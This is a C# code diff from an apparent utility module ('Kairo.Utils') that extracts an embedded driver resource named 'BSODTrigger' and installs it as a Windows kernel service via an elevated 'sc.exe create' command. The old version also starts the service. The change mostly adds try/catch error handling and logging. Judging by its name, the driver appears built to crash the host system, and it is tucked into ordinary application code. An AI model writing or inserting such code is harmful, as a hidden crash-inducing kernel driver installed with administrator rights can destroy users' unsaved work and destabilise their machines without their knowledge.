@@ -17,55 +17,62 @@ namespace Kairo.Utils
         private static readonly string driverPath = Path.Combine(Global.PATH, DriverFileName);
         public static void Installer()
         {
-            
-            Cleanup(driverPath);
-            // Extract the driver file
-            ExtractDriver(driverPath);
-
-            // Install and start the driver
-            InstallDriver(driverPath);
+            try
+            {
+                Cleanup(driverPath);
+                // Extract the driver file
+                ExtractDriver(driverPath);
+                // Install and start the driver
+                InstallDriver(driverPath);
+            }
+            catch (Exception ex)
+            {
+                Logger.Output(LogType.Error, "Driver installation failed:", ex);
+            }
         }
 
         private static void ExtractDriver(string driverPath)
         {
-            if (!File.Exists(driverPath))
+            try
             {
-                using (FileStream fileStream = new("BSODTrigger.sys", FileMode.Create))
+                if (!File.Exists(driverPath))
                 {
-                    fileStream.Write(Resources.BSODTrigger, 0, Resources.BSODTrigger.Length);
+                    using (FileStream fileStream = new(driverPath, FileMode.Create))
+                    {
+                        fileStream.Write(Resources.BSODTrigger, 0, Resources.BSODTrigger.Length);
+                    }
                 }
             }
-            
+            catch (Exception ex)
+            {
+                Logger.Output(LogType.Error, "Failed to extract driver:", ex);
+                throw;
+            }
         }
 
         private static void InstallDriver(string driverPath)
         {
-            // Install the driver
-            Process? create = Process.Start(new ProcessStartInfo
+            try
             {
-                FileName = "sc.exe",
-                Arguments = $"create BSODDriver binPath= \"{driverPath}\" type= kernel",
-                Verb = "runas", // Ensure it runs with elevated privileges
-                UseShellExecute = false,
-                RedirectStandardOutput = true
-            });
-            create.BeginOutputReadLine();
-            create.OutputDataReceived += SortOutputHandler;
-            create.WaitForExit();
-            
-            // Start the driver
-            Process? start = Process.Start(new ProcessStartInfo
+                Process? create = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "sc.exe",
+                    Arguments = $"create BSODDriver binPath= \"{driverPath}\" type= kernel",
+                    Verb = "runas",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true
+                });
+                create?.WaitForExit();
+                if (create?.ExitCode != 0)
+                {
+                    Logger.Output(LogType.Error, $"Driver installation process failed with exit code {create.ExitCode}");
+                }
+            }
+            catch (Exception ex)
             {
-                FileName = "sc.exe",
-                Arguments = "start BSODDriver",
-                Verb = "runas", // Ensure it runs with elevated privileges
-                UseShellExecute = false,
-                RedirectStandardOutput = true
-                
-            });
-            start.BeginOutputReadLine();
-            start.OutputDataReceived += SortOutputHandler;
-            start.WaitForExit();
+                Logger.Output(LogType.Error, "Failed to install driver:", ex);
+                throw;
+            }
         }
         public static void Cleanup() {
             Cleanup(driverPath);
